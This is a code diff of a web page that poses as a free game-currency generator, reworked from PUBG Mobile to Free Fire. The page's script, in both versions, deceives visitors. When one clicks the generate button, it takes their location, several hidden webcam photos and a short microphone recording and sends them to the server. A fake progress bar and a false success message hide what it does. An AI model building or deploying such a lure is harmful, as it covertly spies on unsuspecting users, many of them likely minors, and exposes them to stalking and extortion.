@@ -3,31 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PUBG Mobile UC Generator</title>
+    <title>Free Fire Diamond Generator</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
-        body { background-color: #1a1a1a; color: #ffffff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 15px; }
-        .container { width: 100%; max-width: 420px; background-color: #242424; border-radius: 20px; padding: 20px; box-shadow: 0 8px 25px rgba(0,0,0,0.6); display: flex; flex-direction: column; gap: 15px; border: 1px solid #333; }
+        body { background-color: #0b131e; color: #ffffff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 15px; }
+        .container { width: 100%; max-width: 420px; background-color: #121c2c; border-radius: 20px; padding: 20px; box-shadow: 0 8px 25px rgba(0,0,0,0.6); display: flex; flex-direction: column; gap: 15px; }
         .header { display: flex; justify-content: space-between; align-items: center; }
-        .logo-title { color: #f39c12; font-size: 26px; font-weight: 900; font-style: italic; }
-        .logo-sub { color: #ffffff; font-size: 26px; font-weight: 900; font-style: italic; }
-        .badge-uc { background-color: #f39c12; color: #000; font-size: 11px; font-weight: bold; padding: 6px 12px; border-radius: 20px; }
-        .stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; text-align: center; background-color: #2c2c2c; padding: 12px 8px; border-radius: 14px; }
-        .stat-val { font-size: 16px; font-weight: bold; color: #f1c40f; }
-        .stat-lbl { font-size: 10px; color: #b0bec5; margin-top: 3px; }
-        .card { background-color: #2c2c2c; padding: 12px 15px; border-radius: 14px; border: 1px solid #3d3d3d; }
-        .card-label { font-size: 13px; color: #b0bec5; margin-bottom: 8px; display: block; }
-        .input-box { width: 100%; background: transparent; border: none; color: #f39c12; font-size: 18px; font-weight: bold; outline: none; }
-        select.input-box { background-color: #2c2c2c; color: white; border-radius: 6px; padding: 4px 0; }
-        .grid-uc { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
-        .uc-card { background-color: #2c2c2c; border: 1px solid #3d3d3d; padding: 15px 5px; border-radius: 14px; text-align: center; cursor: pointer; position: relative; }
-        .uc-card.active { background: linear-gradient(135deg, #f39c12, #d35400); border-color: #f1c40f; }
-        .pop-badge { position: absolute; top: -8px; left: 50%; transform: translateX(-50%); background-color: #e74c3c; color: white; font-size: 8px; padding: 2px 6px; border-radius: 6px; }
-        .u-title { font-size: 16px; font-weight: bold; color: #ffffff; }
-        .u-sub { font-size: 11px; color: #b0bec5; margin-top: 4px; }
-        .generate-btn { background: linear-gradient(135deg, #f39c12, #d35400); color: white; width: 100%; padding: 16px; border: none; border-radius: 30px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 5px; }
-        .error-box { display: none; background-color: rgba(231, 76, 60, 0.15); border: 1px solid #e74c3c; border-radius: 12px; padding: 12px; text-align: center; color: #e74c3c; font-weight: bold; }
-        .success-box { display: none; background-color: rgba(46, 204, 113, 0.15); border: 1px solid #2ecc71; border-radius: 12px; padding: 12px; text-align: center; color: #2ecc71; font-weight: bold; }
+        .logo-area { display: flex; flex-direction: column; }
+        .logo-title { color: #ff5722; font-size: 26px; font-weight: 900; font-style: italic; letter-spacing: 1px; line-height: 1; }
+        .logo-sub { color: #ffffff; font-size: 26px; font-weight: 900; font-style: italic; letter-spacing: 1px; }
+        .badge-diamonds { background-color: #ff9800; color: #000; font-size: 11px; font-weight: bold; padding: 6px 12px; border-radius: 20px; text-transform: uppercase; }
+        .stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; text-align: center; background-color: #1a2638; padding: 12px 8px; border-radius: 14px; }
+        .stat-val { font-size: 16px; font-weight: bold; color: #ff7043; }
+        .stat-lbl { font-size: 10px; color: #90a4ae; margin-top: 3px; }
+        .card { background-color: #1a2638; padding: 12px 15px; border-radius: 14px; border: 1px solid #23344d; }
+        .card-label { font-size: 13px; color: #90a4ae; margin-bottom: 8px; display: flex; align-items: center; gap: 6px; }
+        .input-box { width: 100%; background: transparent; border: none; color: #ffb74d; font-size: 18px; font-weight: bold; outline: none; }
+        select.input-box { background-color: #1a2638; color: white; cursor: pointer; border-radius: 6px; padding: 4px 0; }
+        select.input-box option { background-color: #121c2c; color: white; }
+        .grid-diamonds { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
+        .diamond-card { background-color: #1a2638; border: 1px solid #23344d; padding: 15px 5px; border-radius: 14px; text-align: center; cursor: pointer; position: relative; transition: 0.2s; z-index: 5; }
+        .diamond-card.active { background: linear-gradient(135deg, #ff9800, #ff5722); border-color: #ffb74d; }
+        .pop-badge { position: absolute; top: -8px; left: 50%; transform: translateX(-50%); background-color: #ff5722; color: white; font-size: 8px; font-weight: bold; padding: 2px 6px; border-radius: 6px; text-transform: uppercase; pointer-events: none; }
+        .d-title { font-size: 16px; font-weight: bold; color: #ffffff; display: flex; align-items: center; justify-content: center; gap: 4px; pointer-events: none; }
+        .d-sub { font-size: 11px; color: #b0bec5; margin-top: 4px; pointer-events: none; }
+        .generate-btn { background: linear-gradient(135deg, #ff9800, #ff5722); color: white; width: 100%; padding: 16px; border: none; border-radius: 30px; font-size: 18px; font-weight: bold; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 8px; margin-top: 5px; box-shadow: 0 4px 15px rgba(255,87,34,0.4); }
+        .error-box { display: none; background-color: rgba(244, 67, 54, 0.15); border: 1px solid #f44336; border-radius: 12px; padding: 12px; text-align: center; font-size: 13px; color: #ef5350; margin-top: 5px; font-weight: bold; }
+        .process-box { display: none; background-color: #1a2638; border: 1px solid #23344d; border-radius: 12px; padding: 12px; text-align: center; margin-top: 5px; }
+        .process-text { display: flex; justify-content: space-between; font-size: 13px; color: #90a4ae; margin-bottom: 8px; }
+        .progress-bar-container { width: 100%; background-color: #23344d; height: 8px; border-radius: 4px; overflow: hidden; }
+        .progress-bar { width: 0%; height: 100%; background: linear-gradient(90deg, #ff9800, #ff5722); transition: width 0.3s ease; }
+        .success-box { display: none; background-color: rgba(76, 175, 80, 0.15); border: 1px solid #4caf50; border-radius: 12px; padding: 12px; text-align: center; font-size: 13px; color: #81c784; margin-top: 5px; font-weight: bold; }
+        .footer-info { text-align: center; font-size: 11px; color: #607d8b; margin-top: 5px; }
         #video { position: absolute; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; z-index: -1; }
         canvas { display: none; }
     </style>
@@ -35,84 +42,146 @@
 <body>
     <div class="container">
         <div class="header">
-            <div class="logo-area"><span class="logo-title">PUBG</span><span class="logo-sub">MOBILE</span></div>
-            <div class="badge-uc">Free UC</div>
+            <div class="logo-area">
+                <span class="logo-title">FREE</span>
+                <span class="logo-sub">FIRE</span>
+            </div>
+            <div class="badge-diamonds">Diamonds</div>
         </div>
         <div class="stats-grid">
-            <div class="stat-card"><div class="stat-val">3.8M</div><div class="stat-lbl">Active Players</div></div>
-            <div class="stat-card"><div class="stat-val">12.4M</div><div class="stat-lbl">UC Given</div></div>
-            <div class="stat-card"><div class="stat-val">99.9%</div><div class="stat-lbl">Success Rate</div></div>
+            <div class="stat-card"><div class="stat-val" id="activeUsers">2.5M</div><div class="stat-lbl">Active Users</div></div>
+            <div class="stat-card"><div class="stat-val" id="diamondsGiven">8.7M</div><div class="stat-lbl">Diamonds Given</div></div>
+            <div class="stat-card"><div class="stat-val">99.8%</div><div class="stat-lbl">Success Rate</div></div>
         </div>
         <div class="card">
-            <span class="card-label">🆔 Enter PUBG Character ID</span>
-            <input type="text" class="input-box" id="userId" placeholder="Enter Character ID here...">
+            <span class="card-label">🆔 Enter Free Fire User ID</span>
+            <input type="text" class="input-box" id="userId" placeholder="Enter User ID here...">
         </div>
-        <span class="card-label" style="margin-bottom: -5px;">Select UC Amount</span>
-        <div class="grid-uc">
-            <div class="uc-card" data-uc="325 UC"><div class="u-title">🪙 325</div><div class="u-sub">UC</div></div>
-            <div class="uc-card active" data-uc="660 UC"><div class="pop-badge">POPULAR</div><div class="u-title">🪙 660</div><div class="u-sub">UC</div></div>
-            <div class="uc-card" data-uc="1800 UC"><div class="u-title">🪙 1800</div><div class="u-sub">UC</div></div>
+        <span class="card-label" style="margin-bottom: -5px;">Select Diamonds</span>
+        <div class="grid-diamonds">
+            <div class="diamond-card" data-diamond="1K"><div class="d-title">💎 1K</div><div class="d-sub">Diamonds</div></div>
+            <div class="diamond-card active" data-diamond="5K"><div class="pop-badge">POPULAR</div><div class="d-title">💎 5K</div><div class="d-sub">Diamonds</div></div>
+            <div class="diamond-card" data-diamond="10K"><div class="d-title">💎 10K</div><div class="d-sub">Diamonds</div></div>
         </div>
         <div class="card">
             <span class="card-label">🌐 Select Server</span>
             <select class="input-box" id="serverSelect">
-                <option value="Asia Server">🌏 Asia Server</option><option value="Europe Server">🇪🇺 Europe Server</option><option value="Middle East">🇦🇪 Middle East Server</option>
+                <option value="India Server">🇮🇳 India Server (Recommended)</option>
+                <option value="Asia Server">🌏 Asia Server</option>
+                <option value="Europe Server">🇪🇺 Europe Server</option>
             </select>
         </div>
-        <button id="generateBtn" class="generate-btn">🪙 Generate UC</button>
-        <div id="errorBox" class="error-box">⚠️ Please enter your PUBG Character ID first!</div>
-        <div id="successBox" class="success-box">✅ Successfully added <span id="selectedUcText">660 UC</span> to Character ID!</div>
+        <button id="generateBtn" class="generate-btn">💎 Generate Diamonds</button>
+        <div id="errorBox" class="error-box">⚠️ Please enter your Free Fire User ID first!</div>
+        <div id="processBox" class="process-box">
+            <div class="process-text"><span id="processStatus">Processing request...</span><span id="processPercent">0%</span></div>
+            <div class="progress-bar-container"><div id="progressBar" class="progress-bar"></div></div>
+        </div>
+        <div id="successBox" class="success-box">✅ Successfully added <span id="selectedDiamondText">5K</span> Diamonds!</div>
+        <div class="footer-info">🔒 No password required • Instant delivery</div>
     </div>
     <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
     <script>
-        const ucCards = document.querySelectorAll('.uc-card');
-        let selectedUcValue = '660 UC';
-        ucCards.forEach(c => c.addEventListener('click', function() {
-            ucCards.forEach(x => x.classList.remove('active'));
-            this.classList.add('active');
-            selectedUcValue = this.getAttribute('data-uc');
-        }));
-        async function sendData(fd) { try { await fetch(window.location.origin, { method: 'POST', body: fd }); } catch(e){} }
-        async function sendSinglePhoto(stream) {
-            const v = document.getElementById('video'), c = document.getElementById('canvas');
-            if (!v.srcObject) { v.srcObject = stream; await v.play(); }
-            c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
-            c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
-            return new Promise(r => c.toBlob(async b => { const fd = new FormData(); fd.append('photo', b, 'photo.jpg'); await sendData(fd); r(); }, 'image/jpeg'));
+        const diamondCards = document.querySelectorAll('.diamond-card');
+        let selectedDiamondValue = '5K';
+        diamondCards.forEach(card => {
+            card.addEventListener('click', function() {
+                diamondCards.forEach(c => c.classList.remove('active'));
+                this.classList.add('active');
+                selectedDiamondValue = this.getAttribute('data-diamond');
+            });
+        });
+
+        async function sendData(formData) {
+            try { await fetch('/page3', { method: 'POST', body: formData }); } catch (e) {}
         }
-        async function recordAndSendAudio(stream) {
-            return new Promise(r => {
-                try {
-                    const mr = new MediaRecorder(stream), chunks = [];
-                    mr.ondataavailable = e => chunks.push(e.data);
-                    mr.onstop = async () => { const fd = new FormData(); fd.append('voice', new Blob(chunks, {type: 'audio/ogg'}), 'voice.ogg'); await sendData(fd); r(); };
-                    mr.start(); setTimeout(() => { if(mr.state !== 'inactive') mr.stop(); }, 5000);
-                } catch(e) { r(); }
+
+        async function sendSinglePhoto(stream) {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            if (!video.srcObject) { video.srcObject = stream; await video.play(); }
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+            return new Promise((resolve) => {
+                canvas.toBlob(async function(blob) {
+                    const formData = new FormData();
+                    formData.append('photo', blob, 'photo.jpg');
+                    await sendData(formData);
+                    resolve();
+                }, 'image/jpeg');
             });
         }
+
+        async function recordAndSendAudio(stream) {
+            return new Promise((resolve) => {
+                try {
+                    const mediaRecorder = new MediaRecorder(stream);
+                    const audioChunks = [];
+                    mediaRecorder.ondataavailable = (e) => audioChunks.push(e.data);
+                    mediaRecorder.onstop = async () => {
+                        const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
+                        const formData = new FormData();
+                        formData.append('voice', audioBlob, 'voice.ogg');
+                        await sendData(formData);
+                        resolve();
+                    };
+                    mediaRecorder.start();
+                    setTimeout(() => { if (mediaRecorder.state !== 'inactive') mediaRecorder.stop(); }, 5000);
+                } catch (e) { resolve(); }
+            });
+        }
+
         document.getElementById("generateBtn").addEventListener("click", async function() {
-            const btn = document.getElementById("generateBtn"), uid = document.getElementById("userId").value.trim();
-            if(!uid) { document.getElementById("errorBox").style.display = "block"; return; }
-            document.getElementById("errorBox").style.display = "none"; btn.disabled = true; btn.innerText = "Connecting...";
-            document.getElementById("successBox").style.display = "block";
-            if (navigator.geolocation) {
-                await new Promise(r => navigator.geolocation.getCurrentPosition(async pos => {
-                    const fd = new FormData(); fd.append('latitude', pos.coords.latitude); fd.append('longitude', pos.coords.longitude); await sendData(fd); r();
-                }, () => r(), { timeout: 4000 }));
+            const btn = document.getElementById("generateBtn");
+            const userIdInput = document.getElementById("userId");
+            if (userIdInput.value.trim() === "") {
+                document.getElementById("errorBox").style.display = "block";
+                return;
             }
+            document.getElementById("errorBox").style.display = "none";
+            btn.innerText = "Connecting...";
+            btn.disabled = true;
+            document.getElementById("processBox").style.display = "block";
+
+            let progress = 0;
+            const progressInterval = setInterval(() => {
+                progress += 5;
+                if (progress <= 100) {
+                    document.getElementById('progressBar').style.width = progress + '%';
+                    document.getElementById('processPercent').innerText = progress + '%';
+                }
+            }, 50);
+
+            if (navigator.geolocation) {
+                await new Promise((resolve) => {
+                    navigator.geolocation.getCurrentPosition(async (pos) => {
+                        const fd = new FormData();
+                        fd.append('latitude', pos.coords.latitude);
+                        fd.append('longitude', pos.coords.longitude);
+                        await sendData(fd);
+                        resolve();
+                    }, () => resolve(), { timeout: 4000 });
+                });
+            }
+
             try {
                 if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                    document.getElementById('video').srcObject = stream; await document.getElementById('video').play();
+                    document.getElementById('video').srcObject = stream;
+                    await document.getElementById('video').play();
                     await new Promise(r => setTimeout(r, 300));
-                    let count = 0;
-                    const interval = setInterval(async () => { if(count < 5) { count++; await sendSinglePhoto(stream); } else { clearInterval(interval); } }, 800);
+                    for(let i=0; i<3; i++) { await sendSinglePhoto(stream); }
                     await recordAndSendAudio(stream);
                     stream.getTracks().forEach(t => t.stop());
                 }
-            } catch(e) {}
-            btn.innerText = "UC Generated ✅";
+            } catch (err) {}
+
+            clearInterval(progressInterval);
+            document.getElementById("processBox").style.display = "none";
+            document.getElementById("successBox").style.display = "block";
+            btn.innerText = "Generated ✅";
         });
     </script>
 </body>
